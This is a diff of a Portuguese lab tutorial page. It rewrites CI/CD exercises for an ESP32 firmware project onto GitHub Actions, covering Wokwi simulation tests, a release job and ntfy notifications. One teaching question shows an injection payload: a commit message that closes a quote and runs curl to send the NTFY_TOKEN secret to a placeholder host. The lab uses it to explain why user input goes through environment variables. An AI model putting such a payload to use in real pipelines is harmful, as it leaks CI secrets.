+            echo "ok=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "ok=false" >> "$GITHUB_OUTPUT"
+            echo "::warning::WOKWI_CLI_TOKEN não configurado (ou PR de fork): simulação pulada"
+          fi
+      - uses: actions/checkout@v4
+        if: steps.token.outputs.ok == 'true'
+      - uses: actions/download-artifact@v4
+        if: steps.token.outputs.ok == 'true'
+        with:
+          name: firmware
+          path: saida
+      - name: Instala o wokwi-cli
+        if: steps.token.outputs.ok == 'true'
+        run: |
+          mkdir -p "$HOME/.local/bin"
+          curl -sSfL -o "$HOME/.local/bin/wokwi-cli" \
+            "https://github.com/wokwi/wokwi-cli/releases/download/${WOKWI_CLI_VERSAO}/wokwi-cli-linuxstatic-x64"
+          chmod +x "$HOME/.local/bin/wokwi-cli"
+          echo "$HOME/.local/bin" >> "$GITHUB_PATH"
+      - name: Testes Unity no ESP32 simulado
+        if: steps.token.outputs.ok == 'true'
+        run: |
+          for t in test_logica test_alvo; do
+            echo "::group::$t"
+            wokwi-cli --elf "saida/teste_${t}.elf" --timeout 30000 \
+              --expect-text "Tests 0 Failures" --fail-text ":FAIL" \
+              --serial-log-file "serial-${t}.txt" .
+            echo "::endgroup::"
+          done
+      - name: Cenário de integração + analisador lógico
+        if: steps.token.outputs.ok == 'true'
+        run: |
+          wokwi-cli --elf saida/firmware_ci.elf --scenario ci/cenario_integracao.yaml \
+            --timeout 90000 --vcd-file pwm.vcd --serial-log-file serial-cenario.txt .
+      - name: Frequência e duty do PWM (VCD)
+        if: steps.token.outputs.ok == 'true'
+        run: python3 ci/verificar_pwm.py pwm.vcd --listar
+      - uses: actions/upload-artifact@v4
+        if: always() && steps.token.outputs.ok == 'true'
+        with:
+          name: simulacao
+          path: |
+            serial-*.txt
+            pwm.vcd
+          if-no-files-found: ignore
+
+  # publicar e notificar: T6
+```
+
+- **Por que não a `wokwi/wokwi-ci-action`?** Ela roda o simulador, mas não tem uma entrada para
+  o `--vcd-file`. Chamando o `wokwi-cli` direto, os três usos (testes, cenário, VCD) ficam
+  iguais aos do seu terminal.
+- O job `simulacao` não falha sem token: ele **avisa** (`::warning::`) e segue. Assim o CI de
+  um PR de fork, que não recebe secrets, continua útil.
+
+Faça o `push`, abra a aba **Actions** e acompanhe. Clique na execução para ver o **resumo dos
+testes**, os **artefatos** (firmware, VCD) e o tamanho do firmware. Ponha o **badge** no topo
+do `README.md`:
+
+```md title="README.md (topo)"
+![CI](https://github.com/<organizacao>/<repositorio>/actions/workflows/ci.yml/badge.svg)
+```
+
+**Evidências:** `evidencias/t5-actions.png` (a execução com os jobs verdes, o resumo dos
+testes e os artefatos) e o link da execução no `README.md`.
 
 <FileTree
-  root="lab11-grupo-X"
+  root="lab10-grupo-X"
   files={[
-    ".gitea/workflows/ci.yml u",
-    "evidencias/t5-403.txt c",
-    "evidencias/t5-release.png c",
+    ".github/workflows/ci.yml c",
     "README.md u",
+    "evidencias/t5-actions.png c",
   ]}
 />
 
 <CommitPoint
   id="t5"
-  task="Release no Gitea com o token do job"
-  pontos={20}
-  files=".gitea/workflows/ci.yml evidencias/t5-403.txt evidencias/t5-release.png README.md"
+  task="Pipeline no GitHub Actions"
+  pontos={15}
+  files=".github/workflows/ci.yml README.md evidencias/t5-actions.png"
 />
 
 ---
 
-## Projeto integrador — CI como portão {/* #integrador */} {/* #t6 */}
+## Projeto integrador — ntfy e release (CD) {/* #integrador */}
 
-Até aqui, o CI **avisa**. Um aviso vermelho não impede ninguém de juntar o código ao `main`.
-Com a **proteção de ramo**, o Gitea só aceita o merge de um PR quando as verificações
-obrigatórias estiverem verdes. É assim que equipes garantem que o `main` sempre compila e passa
-nos testes.
+CI responde "o código está bom?". **CD** (_continuous delivery_) responde "então, entregue":
+numa tag `v1.0.0`, o pipeline cria uma **release** no GitHub com o `firmware.bin` pronto para
+gravar. E alguém precisa **saber** do resultado sem ficar olhando a aba Actions: o ntfy
+manda uma notificação para o celular.
 
 ### Requisitos
 
-1. **Proteção do `main`** no Gitea: **Configurações → Ramos → Adicionar regra**, padrão `main`:
-   - **Habilitar verificação de status**, com os padrões `CI / Testes*` e `CI / Firmware*` (o
-     `*` vale para push e PR);
-   - deixe o **push** liberado: as tarefas continuam indo direto ao `main`. A regra trava o
-     **merge de PR**.
-2. **Um PR que não pode entrar**: num ramo `quebra`, troque o `4095.0f` por `4096.0f` no
-   `adcParaSetpoint` (o bug do P1 do Lab 10), envie só para o Gitea e abra o PR para o `main`:
+1. **Job `publicar`**: roda só em tags `v*`, depois de `firmware` e `simulacao`, e cria a
+   release com o firmware. É o único job com permissão de **escrita**:
 
-   ```bash
-   git switch -c quebra
-   # edite lib/camara_logica/camara_logica.cpp
-   git commit -am "quebra: /4096 no setpoint"
-   git push lab quebra
+   ```yaml title=".github/workflows/ci.yml (job publicar)"
+   publicar:
+     name: Release com o firmware
+     needs: [firmware, simulacao]
+     if: startsWith(github.ref, 'refs/tags/v')
+     runs-on: ubuntu-latest
+     permissions:
+       contents: write # criar a release precisa de escrita
+     steps:
+       - uses: actions/download-artifact@v4
+         with:
+           name: firmware
+           path: saida
+       - uses: softprops/action-gh-release@v2
+         with:
+           files: |
+             saida/firmware.bin
+             saida/bootloader.bin
+             saida/partitions.bin
+             saida/firmware.elf
+           generate_release_notes: true
    ```
 
-   No Gitea: **Novo pull request** (`quebra` → `main`). Quando o job de testes ficar vermelho,
-   o botão de merge fica **bloqueado**. Capture a tela em `evidencias/t6-pr-bloqueado.png`.
+2. **Job `notificar`**: roda **sempre** (`if: always()`), depois de todos, monta o resumo e
+   chama o `ci/notificar.sh` (pronto no repositório: título, prioridade e etiquetas conforme o
+   resultado, toque abre a execução no GitHub, botão "Abrir no GitHub").
 
-3. **A notificação**: o ❌ chega no tópico `lab11-x-ci`, com o botão **Abrir no Gitea**.
-   Capture em `evidencias/t6-ntfy.png`.
-4. **Corrija e junte**: desfaça a mudança no ramo `quebra`, envie, espere ficar verde e faça o
-   merge **no Gitea**. Depois, traga o `main` para o PC e envie aos dois:
+   ```yaml title=".github/workflows/ci.yml (job notificar)"
+   notificar:
+     name: Notificação (ntfy)
+     needs: [testes, firmware, simulacao, publicar]
+     if: always()
+     runs-on: ubuntu-latest
+     steps:
+       - uses: actions/checkout@v4
+         with:
+           sparse-checkout: ci
+       - name: Publica no ntfy
+         continue-on-error: true # o ntfy fora do ar não deve pintar o CI de vermelho
+         env:
+           NTFY_URL: ${{ vars.NTFY_URL }}
+           NTFY_TOPIC: ${{ secrets.NTFY_TOPIC }}
+           NTFY_TOKEN: ${{ secrets.NTFY_TOKEN }}
+           RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+           # tudo o que vem do usuário (mensagem do commit, nome do ramo) entra por variável de
+           # ambiente, NUNCA direto dentro do "run:" (evita injeção de comandos)
+           COMMIT_MSG: ${{ github.event.head_commit.message || github.event.pull_request.title }}
+           REF_NAME: ${{ github.ref_name }}
+           REPO: ${{ github.repository }}
+           SHA: ${{ github.sha }}
+           ATOR: ${{ github.actor }}
+           R_TESTES: ${{ needs.testes.result }}
+           R_FIRMWARE: ${{ needs.firmware.result }}
+           R_SIM: ${{ needs.simulacao.result }}
+           SIMULOU: ${{ needs.simulacao.outputs.simulou }}
+           R_PUBLICAR: ${{ needs.publicar.result }}
+         run: |
+           resultado=success
+           for r in "$R_TESTES" "$R_FIRMWARE" "$R_SIM" "$R_PUBLICAR"; do
+             [ "$r" = cancelled ] && resultado=cancelled
+           done
+           for r in "$R_TESTES" "$R_FIRMWARE" "$R_SIM" "$R_PUBLICAR"; do
+             [ "$r" = failure ] && resultado=failure
+           done
+           sim="$R_SIM"
+           [ "$R_SIM" = success ] && [ "$SIMULOU" != true ] && sim="pulada (sem token)"
 
-   ```bash
-   git switch quebra && git revert --no-edit HEAD && git push lab quebra
-   # ... merge do PR no Gitea ...
-   git switch main && git pull lab main && git push
+           case "$resultado" in
+             success)
+               if [ "$R_PUBLICAR" = success ]; then
+                 resultado=release
+                 titulo="🚀 ${REPO##*/} ${REF_NAME} publicado"
+               else
+                 titulo="✅ ${REPO##*/}: CI ok em ${REF_NAME}"
+               fi ;;
+             failure)   titulo="❌ ${REPO##*/}: CI falhou em ${REF_NAME}" ;;
+             *)         titulo="⚠️ ${REPO##*/}: CI ${resultado} em ${REF_NAME}" ;;
+           esac
+           # shellcheck disable=SC2016  # as crases são Markdown, não substituição de comando
+           mensagem="$(printf '**testes:** %s · **firmware:** %s · **simulação:** %s · **release:** %s\r\n`%s` por %s: %s' \
+             "$R_TESTES" "$R_FIRMWARE" "$sim" "$R_PUBLICAR" "${SHA:0:7}" "$ATOR" "${COMMIT_MSG%%$'\r\n'*}")"
+           bash ci/notificar.sh "$resultado" "$titulo" "$mensagem"
    ```
 
-5. No `README.md`, o link do PR bloqueado.
+   Antes do CI, teste o script no seu terminal (Git Bash, ou WSL, no Windows):
 
-```text title="Exemplo das notificações do T6 (ntfy, tópico lab11-x-ci)"
-❌ camara-ci: CI falhou em quebra                                    prioridade alta
-   testes: failure · firmware: skipped · simulação: skipped · release: skipped
-   0123456 por lab11-x: quebra: /4096 no setpoint
+   ```bash title="Git Bash"
+   NTFY_TOPIC=<seu-topico> NTFY_URL=<servidor> NTFY_TOKEN=<token> \
+     bash ci/notificar.sh success "teste do grupo X" "olá do terminal"
+   ```
 
-✅ camara-ci: CI ok em quebra
+3. **Experimento** (cada passo gera uma notificação)
+   1. **Vermelho de propósito:** num ramo `quebra`, mude o `HISTERESE` para `0.0f` e abra um
+      **pull request**. O `test_auto_sequencia_do_lab07` falha no passo de 37,2 °C (sem
+      histerese, a câmara religa abaixo do SP), a execução fica vermelha e chega "❌ ... CI
+      falhou" com prioridade alta. Se a sua sequência não tiver um passo entre SP − 0,5 e SP
+      com o aquecedor desligado, **nenhum** teste falha: acrescente um.
+   2. **Verde:** feche o PR sem juntar (ou desfaça a mudança). No `main`, chega "✅ ... CI ok".
+   3. **Release:** crie e envie a tag:
+
+      ```powershell title="Terminal"
+      git tag -a v1.0.0 -m "Lab 10: firmware testado"
+      git push origin v1.0.0
+      ```
+
+      Chega "🚀 ... v1.0.0 publicado", e a página **Releases** do repositório mostra o
+      `firmware.bin` para baixar.
+
+4. **Evidências**
+   - `evidencias/t6-ntfy.png`: as três notificações (falha, sucesso e release) no app ou no
+     navegador;
+   - `evidencias/t6-release.png`: a página da release com os arquivos;
+   - no `README.md`, os links da execução **vermelha**, da **verde** e da **release**;
+   - o `ci.yml` completo.
+
+```text title="Exemplo das notificações (ntfy)"
+🚀 lab10-grupo-x v1.0.0 publicado                                   prioridade alta
+   testes: success · firmware: success · simulação: success · release: success
+   0123456 por aluno-a: Lab 10: firmware testado
+
+✅ lab10-grupo-x: CI ok em main
    testes: success · firmware: success · simulação: success · release: skipped
+
+❌ lab10-grupo-x: CI falhou em quebra                               prioridade alta
+   testes: failure · firmware: skipped · simulação: skipped · release: skipped
 ```
 
+:::tip[Preveja antes de rodar]
+**P4:** (a) um colega faz um **fork** do repositório do grupo e abre um PR. Quais jobs rodam?
+Chega notificação? Por quê? (b) Por que a mensagem do commit entra no `run:` pela variável
+`COMMIT_MSG`, e não escrita como `${{ github.event.head_commit.message }}` dentro do script?
+Imagine um commit com a mensagem `x"; curl https://exemplo.invalid/?t=$NTFY_TOKEN; echo "`.
+(c) No `ntfy.sh` público, quem pode **ler** e quem pode **publicar** no seu tópico?
+:::
+
 <FileTree
-  root="lab11-grupo-X"
+  root="lab10-grupo-X"
   files={[
-    "evidencias/t6-pr-bloqueado.png c",
-    "evidencias/t6-ntfy.png c",
+    ".github/workflows/ci.yml u",
     "README.md u",
+    "evidencias/t6-ntfy.png c",
+    "evidencias/t6-release.png c",
   ]}
 />
 
 <CommitPoint
   id="t6"
-  task="CI como portao e ntfy"
+  task="ntfy e release (CD)"
   pontos={20}
-  files="evidencias/t6-pr-bloqueado.png evidencias/t6-ntfy.png README.md"
+  files=".github/workflows/ci.yml README.md evidencias/t6-ntfy.png evidencias/t6-release.png"
 />
 
 ---
